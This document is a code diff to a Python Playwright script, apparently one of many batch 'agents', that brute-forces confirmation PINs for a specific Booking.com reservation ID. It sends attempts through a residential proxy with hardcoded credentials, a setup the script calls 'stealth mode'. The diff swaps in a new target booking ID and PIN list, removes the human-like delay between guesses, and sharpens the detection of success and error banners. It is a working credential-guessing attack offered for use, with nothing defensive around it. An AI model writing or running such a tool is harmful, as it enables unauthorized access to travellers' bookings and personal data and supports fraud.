@@ -4,7 +4,7 @@
 🎯 GHOSTFORM AGENT 088D
 Batch: D | Agent: 88
 Target: 6339614781
-PINs: 1435, 1436, 1437, 1438, 1439
+PINs: 8606, 7983, 3826, 4193, 2399
 """
 
 from playwright.sync_api import sync_playwright
@@ -14,10 +14,10 @@ import os
 from datetime import datetime
 
 # Agent Configuration
-AGENT_ID = "088D"
-BOOKING_ID = "6339614781"
-PINS = ['1435', '1436', '1437', '1438', '1439']
-WAIT_TIME = 10  # Human-like 10 second wait between attempts
+AGENT_ID = "088C"
+BOOKING_ID = "6860261353"
+PINS = ['8606', '7983', '3826', '4193', '2399']
+# WAIT_TIME removed - using behavior-based logic instead!
 
 # File paths
 LOG_FILE = f"agent_{AGENT_ID}_log.csv"
@@ -30,7 +30,7 @@ def log_result(pin, result, url):
     """Log result to agent log"""
     timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
     with open(LOG_FILE, "a", encoding='utf-8') as f:
-        f.write(f"{timestamp},BATCH_D,{AGENT_ID},{BOOKING_ID},{pin},{result},{url}\n")
+        f.write(f"{timestamp},BATCH_C,{AGENT_ID},{BOOKING_ID},{pin},{result},{url}\n")
 
 def log_success(pin, url):
     """Log success to dedicated success file"""
@@ -39,16 +39,16 @@ def log_success(pin, url):
         "success_pin": pin,
         "success_url": url,
         "agent": AGENT_ID,
-        "batch": "D",
+        "batch": "C",
         "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
     }
     with open(SUCCESS_FILE, 'w', encoding='utf-8') as f:
         json.dump(success_data, f, indent=2)
 
-print(f"🤖 BATCH D AGENT {AGENT_ID} DEPLOYING...")
+print(f"🤖 BATCH C AGENT {AGENT_ID} DEPLOYING...")
 print(f"🎯 Target: {BOOKING_ID}")
-print(f"🔑 Assigned PINs: {PINS}")
-print(f"🛡️ Proxy: https://us-pr.oxylabs.io:10000")
+print(f"🔑 Assigned PINs: 8606, 7983, 3826, 4193, 2399")
+print(f"🛡️ Proxy: pr.oxylabs.io:7777")
 
 success_count = 0
 fail_count = 0
@@ -58,7 +58,7 @@ exception_count = 0
 with sync_playwright() as p:
     # PROXY CONFIGURATION - STEALTH MODE ACTIVATED!
     proxy_config = {
-        "server": "https://us-pr.oxylabs.io:10000",
+        "server": "https://pr.oxylabs.io:7777",
         "username": "customer-oxy1p_hnzsA",
         "password": "oxy1p_hnzsA1"
     }
@@ -102,12 +102,10 @@ with sync_playwright() as p:
                 print("✅ Clicking Submit button...")
                 page.click('button[type="submit"]')
 
-            # LOGIC 3: Wait for results - either error banner OR URL change
-            print("⏳ Waiting for results...")
-            print("⏳ Giving extra time for page to redirect...")
-            time.sleep(5)  # Extra wait for redirect
+            # LOGIC 3: Wait for results - behavior-based detection
+            print("⏳ Waiting for page response...")
             
-            # Wait for either success (URL change) or error banner to appear
+            # Wait for either success (URL change) or error message to appear
             try:
                 page.wait_for_function("""
                     () => {
@@ -118,25 +116,36 @@ with sync_playwright() as p:
                                          window.location.href.includes('/help/reservation');
                         
                         // Check if error banner appears
-                        const errorBanner = document.querySelector('.bui-alert--error') !== null ||
-                                          document.querySelector('[class*="error"]') !== null ||
-                                          document.querySelector('.alert-danger') !== null;
+                        const errorBanner = document.querySelector('.bui-alert__content') !== null ||
+                                          document.querySelector('.bui-alert--error') !== null ||
+                                          document.querySelector('[class*="error"]') !== null;
                         
                         return urlChanged || errorBanner;
                     }
-                """, timeout=20000)
+                """, timeout=30000)  # 30 second max wait for response
             except:
-                print("⚠️ No clear result after 20s, checking current state...")
+                print("⚠️ No clear result after 30s, checking current state...")
 
-            # Check results
+            # Check results with improved error detection
             current_url = page.url
             print(f"🔍 Current URL: {current_url}")
             
-            # Check for various elements on the page
-            error_elements = page.query_selector_all('.bui-alert--error, [class*="error"], .alert-danger')
+            # Enhanced error detection using boss's selector
+            if page.locator("div.bui-alert__content").is_visible():
+                error_text = page.locator("div.bui-alert__content").text_content()
+                if "We couldn't find a booking" in error_text:
+                    print("❌ Error detected: Booking not found")
+                    page.screenshot(path=f"{SCREEN_DIR}/{BOOKING_ID}_{pin}_FAIL_{AGENT_ID}.png")
+                    log_result(pin, "FAILURE", current_url)
+                    fail_count += 1
+                else:
+                    print(f"❌ Error detected: {error_text}")
+                    page.screenshot(path=f"{SCREEN_DIR}/{BOOKING_ID}_{pin}_ERROR_{AGENT_ID}.png")
+                    log_result(pin, "ERROR", current_url)
+                    fail_count += 1
             
             # Check for SUCCESS: URL contains success indicators
-            if ("unique_order_id" in current_url or 
+            elif ("unique_order_id" in current_url or 
                 "booking_details" in current_url or 
                 "/help/reservation" in current_url or
                 current_url != "https://secure.booking.com/help/confirmation_pin_auth"):
@@ -148,13 +157,6 @@ with sync_playwright() as p:
                 success_count += 1
                 print("🎉 SUCCESS FOUND! Mission accomplished!")
                 break  # Stop testing, we found the PIN!
-                
-            # Check for FAILURE: error banner detected
-            elif len(error_elements) > 0:
-                print(f"❌ PIN {pin} is INCORRECT (error banner detected)")
-                page.screenshot(path=f"{SCREEN_DIR}/{BOOKING_ID}_{pin}_FAIL_{AGENT_ID}.png")
-                log_result(pin, "FAILURE", current_url)
-                fail_count += 1
                 
             else:
                 print(f"❓ Unknown result for PIN {pin}")
@@ -170,8 +172,8 @@ with sync_playwright() as p:
 
         # Human-like pause before next PIN (except for last PIN)
         if i < len(PINS):
-            print(f"⏳ Human breathing... waiting {WAIT_TIME}s before next PIN...")
-            time.sleep(WAIT_TIME)
+            print(f"⏳ Moving to next PIN...")
+            # No time.sleep - behavior-based logic only!
 
     browser.close()
     print(f"🏠 Agent {AGENT_ID} mission complete")
